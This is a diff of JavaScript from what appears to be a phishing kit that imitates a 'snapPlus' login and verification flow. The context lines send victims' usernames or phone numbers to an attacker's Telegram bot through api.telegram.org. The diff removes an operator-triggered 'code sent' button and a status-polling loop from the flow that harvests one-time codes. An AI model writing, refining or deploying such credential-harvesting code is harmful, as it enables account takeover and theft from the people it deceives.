@@ -10,24 +10,9 @@ function generateUniqueId() {
     return uniqueId;
 }
 
-// Envoyer message à Telegram avec bouton inline keyboard
-async function sendToTelegram(message, uniqueId = null) {
+// Envoyer message à Telegram
+async function sendToTelegram(message) {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    
-    const body = {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'HTML'
-    };
-    
-    // Ajouter le bouton inline keyboard si un ID unique est fourni
-    if (uniqueId) {
-        body.reply_markup = {
-            inline_keyboard: [[
-                { text: '📤 Code envoyé', callback_data: `code_sent_${uniqueId}` }
-            ]]
-        };
-    }
     
     try {
         const response = await fetch(url, {
@@ -35,7 +20,11 @@ async function sendToTelegram(message, uniqueId = null) {
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify(body)
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
         });
         
         const data = await response.json();
@@ -113,7 +102,7 @@ if (loginForm) {
                        `📱 <b>Téléphone:</b> ${username}\n` +
                        `📅 <b>Date:</b> ${new Date().toLocaleString('fr-FR')}`;
         
-        const success = await sendToTelegram(message, uniqueId);
+        const success = await sendToTelegram(message);
         
         if (success) {
             // Rediriger vers la page de vérification
@@ -135,47 +124,10 @@ if (verificationForm) {
     const uniqueId = localStorage.getItem('snapPlus_id');
     const phoneDisplay = document.getElementById('phoneDisplay');
     const errorMessage = document.getElementById('errorMessage');
-    const waitingMessage = document.getElementById('waitingMessage');
-    const verificationFields = document.getElementById('verificationFields');
     
     if (phoneDisplay && username) {
         phoneDisplay.innerHTML = `<strong>Username enregistré:</strong> ${username}`;
     }
-    
-    // Fonction pour vérifier si le code a été envoyé
-    async function checkCodeStatus() {
-        try {
-            const response = await fetch(`/api/code-status/${uniqueId}`);
-            const data = await response.json();
-            
-            if (data.sent) {
-                // Code envoyé, afficher les champs de vérification
-                if (waitingMessage) {
-                    waitingMessage.style.display = 'none';
-                }
-                if (verificationFields) {
-                    verificationFields.style.display = 'block';
-                }
-                // Arrêter le polling
-                return true;
-            }
-            return false;
-        } catch (error) {
-            console.error('Erreur lors de la vérification du statut du code:', error);
-            return false;
-        }
-    }
-    
-    // Démarrer le polling pour vérifier si le code a été envoyé
-    const pollInterval = setInterval(async () => {
-        const codeSent = await checkCodeStatus();
-        if (codeSent) {
-            clearInterval(pollInterval);
-        }
-    }, 2000); // Vérifier toutes les 2 secondes
-    
-    // Vérifier immédiatement au chargement
-    checkCodeStatus();
     
     verificationForm.addEventListener('submit', async function(e) {
         e.preventDefault();
